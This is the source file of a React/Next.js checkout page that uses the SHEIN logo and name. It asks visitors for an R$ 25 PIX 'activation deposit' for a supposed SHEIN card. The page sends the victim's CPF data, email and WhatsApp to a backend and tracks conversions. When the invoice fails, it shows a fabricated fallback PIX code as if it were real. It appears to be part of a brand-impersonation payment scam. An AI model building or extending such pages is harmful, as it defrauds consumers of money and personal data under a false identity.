"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Copy, CheckCircle, Shield, ArrowLeft, Clock } from "lucide-react"
import { useWebhookPaymentMonitor } from "@/hooks/use-webhook-payment-monitor"
import { useOptimizedTracking } from "@/hooks/use-optimized-tracking"
import { SmartQRCode } from "@/components/smart-qr-code"

interface InvoiceData {
  id: string
  invoice_id: string
  external_id: string
  pix: {
    payload: string
    image: string
    qr_code: string
  }
  status: {
    code: number
    title: string
    text: string
  }
  valores: {
    bruto: number
    liquido: number
  }
  vencimento: {
    dia: string
  }
  type: "real" | "simulated" | "emergency"
}

export default function UppCheckoutPage() {
  const [copied, setCopied] = useState(false)
  const [loading, setLoading] = useState(true)
  const [invoice, setInvoice] = useState<InvoiceData | null>(null)
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutos
  const [userName, setUserName] = useState("")
  const [error, setError] = useState<string | null>(null)

  const router = useRouter()
  const timerRef = useRef<NodeJS.Timeout | null>(null)

  // Valor fixo para ativação
  const activationAmount = "25.00"

  // Optimized tracking
  const { track, trackPageView, trackConversion } = useOptimizedTracking({
    enableDebug: process.env.NODE_ENV === "development",
  })

  // Webhook payment monitoring (NO RATE LIMITING!)
  const {
    paymentStatus,
    isMonitoring,
    error: webhookError,
    isPaid,
    redirectUrl,
    checkCount,
    maxChecks,
  } = useWebhookPaymentMonitor({
    externalId: invoice?.external_id,
    enableDebug: process.env.NODE_ENV === "development",
    onPaymentConfirmed: (data) => {
      console.log("🎉 PAGAMENTO CONFIRMADO VIA WEBHOOK SUPERPAYBR (ACTIVATION)!")
      console.log("📊 Dados do pagamento:", data)

      // Track conversion
      trackConversion("activation_payment_confirmed", data.amount)

      // Salvar confirmação no localStorage
      localStorage.setItem("activationPaymentConfirmed", "true")
      localStorage.setItem("activationPaymentAmount", data.amount.toFixed(2))
      localStorage.setItem("activationPaymentDate", data.paid_at || new Date().toISOString())
      localStorage.setItem("activationExternalId", data.external_id)

      // Redirecionar para /upp10 (fluxo activation)
      console.log("🚀 Redirecionando para /upp10...")
      setTimeout(() => {
        window.location.href = "/upp10"
      }, 2000)
    },
    onPaymentDenied: (data) => {
      console.log("❌ PAGAMENTO NEGADO VIA WEBHOOK SUPERPAYBR (ACTIVATION)!")
      track("activation_payment_denied", {
        amount: data.amount,
        reason: data.status,
      })
    },
    onPaymentExpired: (data) => {
      console.log("⏰ PAGAMENTO VENCIDO VIA WEBHOOK SUPERPAYBR (ACTIVATION)!")
      track("activation_payment_expired", { amount: data.amount })
    },
    onError: (error) => {
      console.error("❌ Erro no monitoramento webhook (ACTIVATION):", error)
      track("activation_payment_monitoring_error", { error })
    },
  })

  // Track page view on mount
  useEffect(() => {
    trackPageView("/upp/checkout")
    track("activation_checkout_page_loaded", {
      amount: Number.parseFloat(activationAmount),
    })
  }, [trackPageView, track, activationAmount])

  useEffect(() => {
    // Carregar dados do usuário
    const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
    setUserName(cpfData.nome?.split(" ")[0] || "")

    // Criar fatura de ativação SuperPayBR
    createActivationInvoice()
  }, [])

  // Timer countdown
  useEffect(() => {
    if (timeLeft > 0 && invoice && !isPaid) {
      timerRef.current = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
    } else if (timeLeft === 0) {
      setError("Tempo expirado. Gere um novo PIX.")
      track("activation_payment_timeout", { amount: Number.parseFloat(activationAmount) })
    }

    return () => {
      if (timerRef.current) clearTimeout(timerRef.current)
    }
  }, [timeLeft, invoice, isPaid, track, activationAmount])

  const createActivationInvoice = async () => {
    try {
      setLoading(true)
      setError(null)

      console.log("🔄 Criando fatura PIX SuperPayBR (ACTIVATION)...")
      console.log("Parâmetros:", { amount: Number.parseFloat(activationAmount) })

      // Track invoice creation start
      track("activation_invoice_creation_started", {
        amount: Number.parseFloat(activationAmount),
        flow_type: "activation",
      })

      // Carregar dados do usuário do localStorage
      const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
      const userEmail = localStorage.getItem("userEmail") || ""
      const userWhatsApp = localStorage.getItem("userWhatsApp") || ""

      console.log("📋 Dados do usuário SuperPayBR (ACTIVATION):", {
        nome: cpfData.nome,
        email: userEmail,
        whatsapp: userWhatsApp,
      })

      const response = await fetch("/api/superpaybr/create-activation-invoice", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-cpf-data": JSON.stringify(cpfData),
          "x-user-email": userEmail,
          "x-user-whatsapp": userWhatsApp,
          "x-redirect-type": "activation", // IMPORTANTE: Definir tipo de redirecionamento
        },
        body: JSON.stringify({
          amount: Number.parseFloat(activationAmount),
          description: "Depósito de Ativação - SHEIN Card",
          redirect_type: "activation", // Para redirecionar para /upp10
          callback_url: `${window.location.origin}/api/superpaybr/callback`, // URL de callback
        }),
      })

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`)
      }

      const data = await response.json()

      if (data.success) {
        setInvoice(data.data)
        localStorage.setItem("activationInvoiceSuperPayBR", JSON.stringify(data.data))
        localStorage.setItem("currentActivationExternalId", data.data.external_id)

        console.log(
          `✅ Fatura SuperPayBR criada (ACTIVATION): ${data.data.type} - Valor: R$ ${(data.data.valores.bruto / 100).toFixed(2)}`,
        )
        console.log(`🆔 External ID: ${data.data.external_id}`)
        console.log(`👤 Cliente: ${cpfData.nome || "N/A"}`)

        // Track successful invoice creation
        track("activation_invoice_created", {
          external_id: data.data.external_id,
          amount: data.data.valores.bruto / 100,
          type: data.data.type,
          customer_name: cpfData.nome,
          flow_type: "activation",
        })
      } else {
        throw new Error(data.error || "Erro ao criar fatura SuperPayBR (ACTIVATION)")
      }
    } catch (error) {
      console.error("Erro ao criar fatura de ativação SuperPayBR:", error)
      setError("Erro ao gerar PIX SuperPayBR. Tente novamente.")

      // Track error
      track("activation_invoice_creation_error", {
        error: error instanceof Error ? error.message : "Unknown error",
        amount: Number.parseFloat(activationAmount),
        flow_type: "activation",
      })

      createEmergencyActivationPix()
    } finally {
      setLoading(false)
    }
  }

  const createEmergencyActivationPix = () => {
    console.log("🚨 Criando PIX de emergência SuperPayBR (ACTIVATION)...")

    const totalAmount = Number.parseFloat(activationAmount)
    const emergencyExternalId = `EMG_ACTIVATION_${Date.now()}`
    const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.quickchart.io/qr/v2/ACTIVATION${Date.now()}520400005303986540${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`

    const emergencyInvoice: InvoiceData = {
      id: `EMG_ACTIVATION_${Date.now()}`,
      invoice_id: `EMERGENCY_ACTIVATION_${Date.now()}`,
      external_id: emergencyExternalId,
      pix: {
        payload: emergencyPix,
        image: "/placeholder.svg?height=250&width=250",
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200&margin=1&format=png`,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(totalAmount * 100),
        liquido: Math.round(totalAmount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "emergency",
    }

    setInvoice(emergencyInvoice)
    setError(null)
    localStorage.setItem("currentActivationExternalId", emergencyExternalId)

    console.log(`✅ PIX de emergência SuperPayBR criado (ACTIVATION) - Valor: R$ ${totalAmount.toFixed(2)}`)

    // Track emergency PIX creation
    track("activation_emergency_pix_created", {
      amount: totalAmount,
      invoice_id: emergencyInvoice.id,
      flow_type: "activation",
    })
  }

  const copyPixCode = async () => {
    if (!invoice) return

    try {
      await navigator.clipboard.writeText(invoice.pix.payload)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)

      // Track PIX code copy
      track("activation_pix_code_copied", {
        external_id: invoice.external_id,
        amount: Number.parseFloat(activationAmount),
        flow_type: "activation",
      })
    } catch (error) {
      console.log("Erro ao copiar:", error)
    }
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Função para simular pagamento (apenas para testes)
  const simulateActivationPayment = async () => {
    if (!invoice?.external_id) {
      console.log("❌ Não é possível simular: External ID não encontrado")
      return
    }

    try {
      console.log("🧪 Simulando pagamento SuperPayBR (ACTIVATION) para:", invoice.external_id)

      const response = await fetch("/api/superpaybr/simulate-payment", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          external_id: invoice.external_id,
          amount: Number.parseFloat(activationAmount),
          redirect_type: "activation",
        }),
      })

      const result = await response.json()

      if (result.success) {
        console.log("✅ Pagamento SuperPayBR simulado com sucesso (ACTIVATION)!")
        track("activation_payment_simulated", {
          external_id: invoice.external_id,
          amount: Number.parseFloat(activationAmount),
          flow_type: "activation",
        })
      } else {
        console.error("❌ Erro na simulação:", result.error)
      }
    } catch (error) {
      console.error("❌ Erro na simulação SuperPayBR (ACTIVATION):", error)
    }
  }

  if (loading) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
            <h2 className="text-xl font-bold mb-2">Processando SuperPayBR...</h2>
            <p className="text-gray-600 mb-2">Criando fatura de ativação</p>
            <div className="text-sm text-gray-500">
              <p>Valor: R$ {Number.parseFloat(activationAmount).toFixed(2)}</p>
              <p>Tipo: Ativação de Conta</p>
              <p>Fluxo: ACTIVATION → /upp10</p>
            </div>
          </div>
        </div>
      </main>
    )
  }

  if (isPaid) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
              <CheckCircle className="w-8 h-8 text-white" />
            </div>
            <h2 className="text-2xl font-bold mb-2 text-green-600">Pagamento Confirmado!</h2>
            <p className="text-gray-600 mb-4">Redirecionando para próxima etapa (/upp10)...</p>
            <div className="animate-pulse bg-gray-200 h-2 rounded-full"></div>
          </div>
        </div>
      </main>
    )
  }

  return (
    <main className="min-h-screen bg-gray-50">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-2xl shadow-xl p-6">
          {/* Header */}
          <div className="mb-6">
            <button onClick={() => router.back()} className="mb-4 p-2 text-gray-600 hover:text-gray-800">
              <ArrowLeft className="w-5 h-5" />
            </button>

            {/* SHEIN Logo */}
            <div className="text-center mb-6">
              <Image src="/shein-logo-updated.png" alt="SHEIN" width={120} height={40} className="mx-auto" priority />
            </div>

            <h1 className="text-2xl font-bold mb-4 text-gray-800">
              {userName && `Olá ${userName}! `}Depósito de Ativação
            </h1>

            <p className="text-gray-600 text-sm mb-4">
              Para ativar seu cartão SHEIN, é necessário fazer um depósito de ativação de R$ 25,00. Este valor será
              creditado como limite no seu cartão após a aprovação.
            </p>
          </div>

          {/* Debug Info */}
          {process.env.NODE_ENV === "development" && (
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4 text-xs">
              <p>
                <strong>External ID:</strong> {invoice?.external_id}
              </p>
              <p>
                <strong>Monitorando:</strong> {isMonitoring ? "✅ Sim" : "❌ Não"}
              </p>
              <p>
                <strong>Status:</strong> {paymentStatus?.status || "N/A"}
              </p>
              <p>
                <strong>Pago:</strong> {isPaid ? "✅ Sim" : "❌ Não"}
              </p>
              <p>
                <strong>Verificações:</strong> {checkCount}/{maxChecks}
              </p>
              <p>
                <strong>Fonte:</strong> {paymentStatus?.source || "N/A"}
              </p>
            </div>
          )}

          {/* Payment Section */}
          <div className="bg-white border-2 border-gray-200 rounded-xl p-6">
            <div className="text-center mb-4">
              <div className="flex items-center justify-center space-x-2 mb-2">
                <span className="text-lg font-bold">Pague via Pix</span>
                <div className="w-6 h-6 bg-teal-500 rounded"></div>
              </div>
              <p className="text-sm text-gray-600">Confirmação automática via webhook SuperPayBR</p>
            </div>

            {/* Amount */}
            <div className="text-center mb-6">
              <p className="text-4xl font-bold text-teal-600">R$ 25,00</p>
              <p className="text-sm text-gray-500">Depósito de Ativação</p>
            </div>

            {/* QR Code */}
            {invoice && (
              <div className="text-center mb-6">
                <div className="bg-white p-4 rounded-lg border-2 border-gray-200 inline-block">
                  <SmartQRCode invoice={invoice} width={200} height={200} className="mx-auto" />
                </div>
                <p className="text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
              </div>
            )}

            {/* PIX Code */}
            {invoice && (
              <div className="mb-6">
                <label className="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
                <div className="flex space-x-2">
                  <input
                    type="text"
                    value={invoice.pix.payload}
                    readOnly
                    className="flex-1 p-3 border border-gray-300 rounded-lg bg-gray-50 text-sm font-mono"
                  />
                  <button
                    onClick={copyPixCode}
                    className={`px-4 py-3 rounded-lg font-medium transition-colors ${
                      copied ? "bg-green-500 text-white" : "bg-gray-200 text-gray-700 hover:bg-gray-300"
                    }`}
                  >
                    {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                  </button>
                </div>
                {copied && <p className="text-green-600 text-sm mt-2">✅ Código copiado!</p>}
              </div>
            )}

            {/* Security */}
            <div className="flex items-center justify-center space-x-2 text-gray-600 mb-4">
              <Shield className="w-4 h-4" />
              <span className="text-sm">Ambiente seguro SuperPayBR</span>
            </div>
          </div>

          {/* Timer */}
          <div className="mt-6 text-center">
            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
              <div className="flex items-center justify-center space-x-2">
                <Clock className="w-5 h-5 text-yellow-600" />
                <span className="font-bold text-yellow-800">Tempo restante: {formatTime(timeLeft)}</span>
              </div>
            </div>
          </div>

          {/* Info */}
          <div className="mt-6 bg-blue-50 border border-blue-200 rounded-lg p-4">
            <p className="text-sm text-blue-800 text-center">
              💡 <strong>Importante:</strong> O depósito será convertido em limite do cartão após aprovação
            </p>
          </div>

          {/* Botão de Teste (apenas em desenvolvimento) */}
          {process.env.NODE_ENV === "development" && invoice?.external_id && (
            <button
              onClick={simulateActivationPayment}
              className="w-full mt-4 bg-green-600 hover:bg-green-700 text-white font-medium py-3 px-4 rounded-lg transition-colors"
            >
              🧪 SIMULAR PAGAMENTO APROVADO (TESTE ACTIVATION)
            </button>
          )}

          {/* Status do Monitoramento */}
          {isMonitoring && (
            <div className="mt-4 text-center">
              <div className="inline-flex items-center space-x-2 text-sm text-blue-600">
                <div className="animate-pulse w-2 h-2 bg-blue-600 rounded-full"></div>
                <span>
                  Monitorando via webhook ({checkCount}/{maxChecks})...
                </span>
              </div>
            </div>
          )}

          {/* Erro do Webhook */}
          {webhookError && (
            <div className="mt-4 bg-red-50 border border-red-200 rounded-lg p-3">
              <p className="text-red-700 text-sm">⚠️ Erro no monitoramento: {webhookError}</p>
            </div>
          )}
        </div>
      </div>
    </main>
  )
}
